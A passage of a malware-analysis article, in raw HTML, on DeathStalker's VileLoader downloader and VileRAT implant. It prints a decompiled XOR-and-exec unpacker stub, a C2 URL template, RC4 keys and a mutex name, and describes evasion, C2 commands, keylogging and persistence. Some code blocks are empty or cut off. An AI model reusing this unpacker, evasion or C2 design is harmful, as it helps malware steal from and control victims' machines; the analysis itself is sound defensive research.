<p>Type B:</p>
		<div id="crayon-6762369aa9ed9316447042" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

<h2 id="vileloader-an-evasive-multi-stage-implant-downloader">VileLoader: an evasive multi-stage implant downloader</h2>
<p>VileLoader is a remarkable piece of the VileRAT compromise approach. While it has existed since Q2 2020 (it was first <a href="https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat">publicly documented</a> as dddp.exe), it has been continuously updated and maintained since, and is still deployed from VileDropper at the time of writing. VileLoader&#8217;s main goal is to download and execute an additional payload from a C2 server. Though we have only observed it triggering the execution of VileRAT, the loader can technically download and execute other implants.</p>
<p>Recent VileLoader samples are composed of a binary executable (stage 1) and an encoded companion shellcode file (stage 2). Previous samples of VileLoader usually embedded the shellcode within the binary executable directly, and presented themselves as a single monolithic file.</p>
<h3 id="stage-1-doctored-binary-unpacker">Stage 1 – Doctored binary unpacker</h3>
<p>VileLoader is initially presented as a binary executable, which ensures the first stage of the execution. This binary is always a legitimate one, which is meticulously doctored by the attackers to integrate a malicious unpacker-type payload. As such, the binary may appear legitimate from a quick automated static code analysis perspective: it includes all the code of a legitimate application (but will not work as expected). This &#8220;unpacker&#8221; stage is aimed at decoding, loading, and executing the second stage in memory.</p>
<p>VileLoader&#8217;s workflow starts by waiting 17 seconds. Then it parses the command line arguments. The command line must include five arguments at least, or VileLoader terminates the execution. In practice, VileDropper usually gives seven arguments to VileLoader, as we have previously described. VileLoader then opens its encoded companion shellcode file (whose name is passed as a second argument to VileLoader, e.g., &#8220;devENX1C6SS.tmp&#8221;), reads and decodes it (using the Type B XOR algorithm), maps the deobfuscated data in a region with read, write and execute (RWX) permissions, and runs the next stage (stage 2) by starting a new thread.</p>
<p>VileLoader&#8217;s first stage contains very unique &#8220;signature&#8221; techniques that have been stable since the first sample we analyzed in Q2 2020:</p>
<ul>
<li>&#8220;Sleep&#8221; and &#8220;GetTickCount&#8221; Windows API functions are leveraged to generate random waiting delays. Those functions are resolved in an unusual way: by referencing hard-coded offsets from the beginning of the current binary image that point directly to entries in the legitimate executable&#8217;s import address table (IAT);</li>
<li>the unpacking and loading of VileLoader&#8217;s encoded companion shellcode file leverages multiple custom-made system calls, that are similar to low-level Windows API functions (<a href="https://www.geoffchappell.com/studies/windows/win32/ntdll/api/index.htm">NTDLL</a>) for different Windows versions: NtOpenFile, NtReadFile, NtAllocateVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject (see Figure 12).
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135659/VileRAT_DeathStalkers_continuous_strike_06.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-107087" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135659/VileRAT_DeathStalkers_continuous_strike_06.png" alt="VileLoader's stage 1 custom-made system call" width="598" height="148" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135659/VileRAT_DeathStalkers_continuous_strike_06.png 598w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135659/VileRAT_DeathStalkers_continuous_strike_06-300x74.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135659/VileRAT_DeathStalkers_continuous_strike_06-370x92.png 370w" sizes="(max-width: 598px) 100vw, 598px" /></a></p>
<p style="text-align: center"><em><strong>Figure 12. VileLoader&#8217;s stage 1 custom-made system call</strong></em></p>
</li>
</ul>
<p>However, while older samples parsed command line arguments by resolving and calling dedicated Windows API functions (such as &#8220;GetCommandLineW&#8221;), the recent samples directly read this information from their own PEB (<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">Process Environment Block</a>) structure. This may have been done to better bypass the detection of some security solutions.</p>
<h3 id="stage-2-in-memory-downloader">Stage 2 – In-memory downloader</h3>
<p>The second stage content is extracted from VileLoader&#8217;s encoded companion shellcode file, and run by VileLoader&#8217;s first stage in-memory, in a new thread. From a data perspective, the second stage shellcode (once unpacked by the first stage) is a PE binary that is stripped of its headers and embeds additional encoded data.</p>
<p>This second stage starts by decoding the required data from its own content (using the Type C XOR algorithm). Some data are decoded as hash values that were generated with the <a href="http://www.cse.yorku.ca/~oz/hash.html">djb2</a> algorithm. Those hashes are in turn used to resolve the required function imports through a homebrew IAT: required libraries are loaded, their export tables are parsed, exported function names are hashed with djb2, and the hashes are compared to hashes that were decoded from internal data. Stage 2 continues by creating a mutex, whose name has been stable since Q2 2020, and which is the same as in VileRAT (&#8220;Global\wU3aqu1t2y8uN&#8221;).</p>
<p>Finally, VileLoader&#8217;s second stage builds an HTTP GET request that is used to download an implant package. In older VileLoader samples, the downloader used a static URL that looked as follows:</p>
		<div id="crayon-6762369aa9edd763008619" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://&lt;domain&gt;/c&amp;v=2&amp;u=&lt;argument 1&gt;&amp;a=&lt;argument 2&gt;&amp;c=&lt;argument 3&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6762369aa9edd763008619-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6762369aa9edd763008619-1"><span class="crayon-i">http</span><span class="crayon-sy">:</span><span class="crayon-c">//&lt;domain&gt;/c&amp;v=2&amp;u=&lt;argument 1&gt;&amp;a=&lt;argument 2&gt;&amp;c=&lt;argument 3&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The only evasion attempt consisted in randomly choosing an HTTP User-Agent header value amongst a fixed list of four. VileLoader used the targeted system&#8217;s uptime as a source of &#8220;randomness&#8221;. In recent samples, developers tried to improve these evasion techniques, and the HTTP request now looks like this:</p>

			</div>
		</div><p>
All values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C XOR algorithm). The encrypted blob (cookie value) is initially a JSON dictionary, encrypted with the RC4 algorithm (using the key &#8220;BD DE 96 D2 9C 68 EE 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 00 4E F2 E4 92 5C 76 AB FC 90 23 DF C6&#8221;, decoded from stage 2 content), XORed (using the Type B XOR algorithm), base64-encoded and URL-encoded. The actual JSON content is very similar to the one that is sent by VileDropper to the C2 server:</p>
<table width="100%">
<tbody>
<tr>
<td width="11%"><strong>JSON Key</strong></td>
<td width="19%"><strong>Provided by VileDropper  via the command line</strong></td>
<td width="70%"><strong>Value</strong></td>
</tr>
<tr>
<td>v</td>
<td></td>
<td>Hard-coded value (65 in the last sample we analyzed) which might be a version number.</td>
</tr>
<tr>
<td>u</td>
<td>&#x2714;&#xfe0f;</td>
<td>The target identifier.</td>
</tr>
<tr>
<td>a</td>
<td>&#x2714;&#xfe0f;</td>
<td>The list of security solutions installed on the targeted computer.</td>
</tr>
<tr>
<td>w</td>
<td>&#x2714;&#xfe0f;</td>
<td>The target&#8217;s operating system version.</td>
</tr>
<tr>
<td>d</td>
<td>&#x2714;&#xfe0f;</td>
<td>A fixed identifier, which might designate a campaign or version.</td>
</tr>
<tr>
<td>n</td>
<td>&#x2714;&#xfe0f;</td>
<td>The target&#8217;s fully qualified login (%USERDOMAIN%\%USERNAME%).</td>
</tr>
<tr>
<td>r</td>
<td></td>
<td>Flag that indicates if the mutex creation succeeded (1) or failed (0).</td>
</tr>
<tr>
<td>xn</td>
<td></td>
<td>Current process name (e.g., SerenadeDACplApp.exe).</td>
</tr>
<tr>
<td>s</td>
<td></td>
<td>Constant value embedded in the code and equal to 0.</td>
</tr>
</tbody>
</table>
<p>The C2 server then answers in the HTTP response body, with one of the following instructions:</p>
<ul>
<li>do nothing: the answer is four null bytes;</li>
<li>implant package: the answer is an encoded implant package to parse (see later);</li>
<li>send a screenshot: the answer is a byte of value &#8220;1&#8221;, followed by three null bytes.</li>
</ul>
<p>In older variants, VileLoader&#8217;s second stage did not embed the screenshot capability, which was, however, implemented in VileRAT.</p>
<p>If the C2 server answers with an implant package, it sends a Type D XORed blob. The resulting data is further decompressed using the <a href="https://www.7-zip.org/sdk.html">LZMA1</a> algorithm, and contains one or several &#8220;files&#8221; with the following additional metadata:</p>
<ul>
<li>A <a href="https://docs.microsoft.com/en-us/windows/win32/shell/csidl">CSIDL</a> value, representing the root folder in which the file must be dropped (resolved with the &#8220;SHGetFolderPathW&#8221; Windows API function);</li>
<li>A subdirectory name;</li>
<li>A file name;</li>
<li>A task name if the file execution is to be scheduled;</li>
<li>The command-line arguments if the file is to be executed.</li>
</ul>
<p>If a specific flag is set in the C2 server response data, VileLoader creates a Windows scheduled task for the last dropped file to set up its persistence. The task is created using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nn-taskschd-itaskservice">ITaskService</a> interface. Finally, the last dropped file is also immediately executed using the &#8220;CreateProcessW&#8221; Windows API function. It should be noted that some older VileLoader samples executed the downloaded payload in memory, while recent variants tend to drop the downloaded implant on the target&#8217;s filesystem.</p>
<p>If the C2 server requests a screenshot, then VileLoader stage 2 sends an HTTP POST request with a cookie whose value is a XORed (Type B algorithm) JSON dictionary containing the following fields:</p>
<table width="100%">
<tbody>
<tr>
<td width="15%"><strong>JSON Key</strong></td>
<td width="85%"><strong>Value</strong></td>
</tr>
<tr>
<td>u</td>
<td>Target identifier.</td>
</tr>
<tr>
<td>sc</td>
<td>Constant value (1).</td>
</tr>
<tr>
<td>dt</td>
<td>Screenshot timestamp (in the format &#8220;YYYY-MM-DD HH:MM:SS&#8221;).</td>
</tr>
</tbody>
</table>
<p>The associated HTTP POST body data is an encoded (using the Type B XOR algorithm) JPEG screenshot.</p>
<h2 id="vilerat-a-super-packed-yet-still-overweight-python-implant">VileRAT – A super-packed yet still overweight Python implant</h2>
<p>VileRAT is the last known stage of the intricate eponym infection chain from DeathStalker. It is an obfuscated and packed Python3 RAT, bundled as a standalone binary with <a href="https://www.py2exe.org/">py2exe</a>. We first discovered it in Q2 2020, and it has also subsequently been named PyVil by other vendors.</p>
<h3 id="a-note-on-vilerats-seniority">A note on VileRAT&#8217;s seniority</h3>
<p>The Python library (DLL) that is embedded in a py2exe-bundled binary usually comes from an official Python release. While analyzing VileRAT samples, we noticed that its Python DLL is a custom compilation of Python 3.7 sources: the DLL version is tagged as &#8220;heads/3.7-dirty&#8221;<a href="#_ftn1" name="_ftnref1"><sup>[1]</sup></a> (instead of &#8220;tags/v3.7.4&#8221; for an official release, for instance) and references a shortened Git commit ID of &#8220;0af9bef61a&#8221;. This shortened commit ID matches one in the source code repository of the 3.7 branch of the standard <a href="https://github.com/python/cpython/commit/0af9bef61afffbf128aba76a2e578059621b4f00">CPython implementation</a>, which is dated to 2020-05-23. Due to this commit date and considering the fact that we first discovered VileRAT in Q2 2020, we believe with medium to high confidence that VileRAT was first packaged for deployment in June 2020.</p>
<h3 id="unpacking-vilerat">Unpacking VileRAT</h3>
<p>When we first encountered VileRAT, we noticed that all usual decompiling tools for Python3 (<a href="https://pypi.org/project/uncompyle6/">uncompyle6</a>, <a href="https://pypi.org/project/decompyle3/">decompyle3</a> and <a href="https://github.com/andrew-tavera/unpyc37/">unpyc37</a>, to name just a few) failed to correctly retrieve a Python source from the VileRAT bytecode. Some of our industry peers had the same issue when they encountered it as <a href="https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat">PyVil</a>.</p>
<p>Long story short: the first stage of VileRAT has been obfuscated at the Python bytecode-level, with the intention of breaking existing decompilers (see Figure 13). The bytecode is obfuscated by:</p>
<ul>
<li>adding multiple operations that do not have any effect when executed (neutral operations) and useless data;</li>
<li>adding confusing branching and exceptions handlers;</li>
<li>inserting invalid bytecode in sections that will never be reached during execution (but that decompilers still try – and fail – to decompile).</li>
</ul>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-107088" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-1024x576.png" alt="VileRAT's first stage Python bytecode, in its original form (left) and deobfuscated form (right). The only useful instructions of this excerpt are highlighted in red." width="1024" height="576" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-1024x576.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-300x169.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-768x432.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-800x450.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-311x175.png 311w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-370x208.png 370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07-498x280.png 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135755/VileRAT_DeathStalkers_continuous_strike_07.png 1440w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p style="text-align: center"><em><strong>Figure 13. VileRAT&#8217;s first stage Python bytecode, in its original form (left) and deobfuscated form (right). The only useful instructions of this excerpt are highlighted in red.</strong></em></p>
<p>Once cleaned at bytecode-level, the first stage of VileRAT unpacking can be properly decompiled as Python code:</p>
		<div id="crayon-6762369aa9ee0351812205" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import sys
import zlib
import base64
T8 = base64.b64decode
y6 = zlib.decompress
m5 = T8(b'&lt;a 7-million+ characters long base64 string&gt;')
k9 = bytearray(m5)
Y7 = bytearray(b'0sMIsDYmkeST5ZJHOfHkwmrA5JGVmpBbpKeA')
N2 = bytearray(len(k9)*bytes([0]))
j = 0
code_length = int(len(k9)/5)
for i in range(code_length):
    if i % 3 == 0:
        N2[i] = k9[i] ^ Y7[j]
    N2[i] = k9[i]
    if j + 1 == len(Y7):
        j = 0
    j += 1
N2[i:] = k9[i:]
exec(y6(N2))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-2">2</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-4">4</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-6">6</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-8">8</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-10">10</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-12">12</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-14">14</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-16">16</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-18">18</div><div class="crayon-num" data-line="crayon-6762369aa9ee0351812205-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-6762369aa9ee0351812205-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6762369aa9ee0351812205-1"><span class="crayon-e">import </span><span class="crayon-e">sys</span></div><div class="crayon-line crayon-striped-line" id="crayon-6762369aa9ee0351812205-2"><span class="crayon-e">import </span><span class="crayon-e">zlib</span></div><div class="crayon-line" id="crayon-6762369aa9ee0351812205-3"><span class="crayon-e">import </span><span class="crayon-e">base64</span></div><div class="crayon-line crayon-striped-line" id="crayon-6762369aa9ee0351812205-4"><span class="crayon-i">T8</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span></div><div class="crayon-line" id="crayon-6762369aa9ee0351812205-5"><span class="crayon-i">y6</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">zlib</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-6762369aa9ee0351812205-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">j</span><span class="crayon-h"> </span>+=<span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-6762369aa9ee0351812205-19"><span class="crayon-i">N2</span><span class="crayon-sy">[</span><span class="crayon-i">i</span><span class="crayon-sy">:</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">k9</span><span class="crayon-sy">[</span><span class="crayon-i">i</span><span class="crayon-sy">:</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6762369aa9ee0351812205-20"><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-e">y6</span><span class="crayon-sy">(</span><span class="crayon-i">N2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
VileRAT embeds no less than three layers of unpacking. The efforts that have been put into making a Python script (VileRAT) hard to analyze from a human perspective is a DeathStalker signature by itself, considering they also tried the same for all the other steps in the infection chain, and that it is part of their <a href="https://securelist.com/what-did-deathstalker-hide-between-two-ferns/99616/">usual approach</a>.</p>
<p>The last unpacking step finally extracts the VileRAT Python code and a whole bundle of its dependencies in memory – all this content causes py2exe-bundled VileRAT samples to weigh around 12MB. The unpacking leverages decoding (using the Type B XOR algorithm) and BZIP2 decompression. The final VileRAT Python package notably contains a conf.pyc module which includes a version number, as well as default C2 domain names:</p>
		<div id="crayon-6762369aa9ee3936585149" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

		</div><p>
<h3 id="vilerat-versions-and-functionalities">VileRAT versions and functionalities</h3>
<p>We analyzed and compared various VileRAT samples, containing version numbers ranging from 2.4 to 8. VileRAT functionalities have not changed much over time, and some functionalities from the earliest sample we analyzed have actually been dropped (such as leveraging SSH as a C2 channel, or screenshotting, the latter now being implemented in VileLoader instead). The remaining functionalities include:</p>
<ul>
<li>Arbitrary remote command execution, using an existing or downloaded binary;</li>
<li>Establishing SSH connections to remote servers, possibly leveraging them to forward ports of the targeted computer to the remote server;</li>
<li>Keylogging;</li>
<li>Setting up persistence using scheduled tasks;</li>
<li>Listing security solutions that are installed on the target computer;</li>
<li>Self-updating from a C2 server.</li>
</ul>
<p>VileRAT has five distinct and exclusive execution modes, enabled from the command line, which can all be further altered with additional command switches, parameters and/or data from the C2:</p>
<table width="100%">
<tbody>
<tr>
<td width="20%"><strong>Command line option</strong></td>
<td width="30%"><strong>Internal name(s)</strong></td>
<td width="50%"><strong>Execution mode description</strong></td>
</tr>
<tr>
<td>-a</td>
<td>enc_cmd_data</p>
<p>RUN_CMD_AS_USER_ARG</td>
<td><strong>Arbitrary command execution</strong></p>
<p>The &#8220;command&#8221; term is quite large: it can either be an existing binary, a shell command, a downloaded executable, a Python package, or an internal VileRAT function. In order to specify the &#8220;command&#8221;, a JSON dictionary<a href="#_ftn2" name="_ftnref2"><sup>[2]</sup></a> is passed as an optional parameter. Some commands will be executed by starting VileRAT again, using a distinct set of command options. VileRAT exits after this execution.</td>
</tr>
<tr>
<td>-l</td>
<td>enc_cmd_data_rss</p>
<p>RUN_R_SSH_SHELL_ARG</td>
<td><strong>SSH connection test</strong></p>
<p>VileRAT starts a new process of itself, which connects to a remote SSH server (using a private key), then… closes the connection. This SSH connection used to serve as a C2 channel in previous samples, but the C2 logic has been removed in recent samples. In order to specify the SSH connection settings, a JSON dictionary is passed as an optional parameter. VileRAT exits after this execution.</td>
</tr>
<tr>
<td>-r</td>
<td>enc_cmd_data_rds</p>
<p>RUN_R_DYN_SSH_ARG</td>
<td><strong>SSH-tunneled local port forward</strong></p>
<p>VileRAT starts a new process of itself, which connects to a remote SSH server (using a password). This connection is leveraged as a tunnel to forward ports from the target computer to the remote server. In order to specify the SSH connection settings, a JSON dictionary is passed as an optional parameter. VileRAT quits once the remote end has connected to the forwarded port at least once, and subsequently closed the connection.</td>
</tr>
<tr>
<td>-c</td>
<td>cp_exe_path</td>
<td><strong>Arbitrary file deletion</strong></p>
<p>VileRAT attempts to delete a file, whose path is given as a clear text command parameter. VileRAT quits when the file is deleted or when the maximum number of attempts (10) is reached.</td>
</tr>
<tr>
<td>-t</td>
<td>rts</p>
<p>IS_TASK_SCHED_ARG</td>
<td><strong>Main C2 client mode</strong></p>
<p>This is the main execution mode for VileRAT. It regularly polls a C2 server for commands to execute. The commands that can be executed are one of those described in this table (RUN_R_SSH_SHELL_ARG, RUN_CMD_AS_USER_ARG, RUN_R_DYN_SSH_ARG), or one of the additional VileRAT internal update commands. CMD_UPDATE_SVC triggers a (partial or complete) VileRAT update from a C2-downloaded package, while CMD_UPDATE_CONF can update internal delays and enable a keylogger if the C2 requires so.</td>
</tr>
</tbody>
</table>
<p>In a typical first execution for VileRAT, as we identified in 2022, the implant is started with the following arguments:</p>
		<div id="crayon-6762369aa9ee4125952314" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ImagesInfo.exe "[u]" -x -m "EDP CredsTask" -i</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6762369aa9ee4125952314-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6762369aa9ee4125952314-1"><span class="crayon-i">ImagesInfo</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-s">"[u]"</span><span class="crayon-h"> </span>-<span class="crayon-i">x</span><span class="crayon-h"> </span>-<span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-s">"EDP CredsTask"</span><span class="crayon-h"> </span>-<span class="crayon-i">i</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Note than in this case, the target identifier that is passed as the first argument is not actually exploited by VileRAT, and may just be used by the attacker to easily identify running VileRAT processes later. Older VileRAT variants were usually launched with explicit &#8220;-f&#8221; and &#8220;-t&#8221; command line switches: those are now implicit and enabled by default.</p>
<p>Here is the list of some notable VileRAT changes we spotted as the versions evolved, apart from regular updates to fix code bugs or handle uncaught exceptions, refactor code, update dependencies, and change configuration:</p>
<ul>
<li>Between versions 2.4 and 2.7, VileRAT dropped the capability to use a remote SSH server as a C2 channel, as well as the screenshot implementation;</li>
<li>In version 3.0, the base64-encoded RC4 key which is used for various encryption routines changed from &#8220;Ixada4bxU3G0AgjcX+s0AYndBs4wiviTVIAwDiiEPPA=&#8221; to &#8220;XMpPrh70/0YsN3aPc4Q4VmopzKMGvhzlG4f6vk4LKkI=&#8221;, and an additional XOR pass (of Type B) was added in encoding schemes. The VileRAT remote update mechanism was refactored, and an additional command switch (called pmode) was added;</li>
<li>In version 3.7, specific Chrome version and Trezor wallet reconnaissance functions that we initially identified for version 2.4 were removed from the code, and VileRAT lost the ability to update from files provided on the filesystem where it was running;</li>
<li>In version 5.4, the way UUID-type identifiers were generated changed;</li>
<li>In version 6.5, an additional command switch (called jmode) was added;</li>
<li>In version 6.6, &#8220;-f&#8221; and &#8220;-t&#8221; command options were enabled by default.</li>
</ul>
<h3 id="vilerat-http-c2-protocol">VileRAT HTTP C2 protocol</h3>
<p>VileRAT&#8217;s main C2 communication loop, as executed during Main C2 client mode (as described in VileRAT functionalities above), is quite straightforward and runs in a separate thread:</p>
<ul>
<li>Every 2-5 minutes, VileRAT tries to send an HTTP POST request to each of the C2 servers that exist in its configuration, until one replies or until the list is exhausted. Environment data is embedded in a JSON dictionary, which is encrypted using RC4, encoded using the Type B XOR algorithm, base64-encoded and URL-encoded, then finally set as the HTTP request URL path (see Figure 14);</li>
<li>A C2 server may reply with an HTTP response, whose body can include an encoded and encrypted JSON array. If so, the JSON must contain at least a command to execute.</li>
</ul>

		<div id="crayon-6762369aa9ee6141945347" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
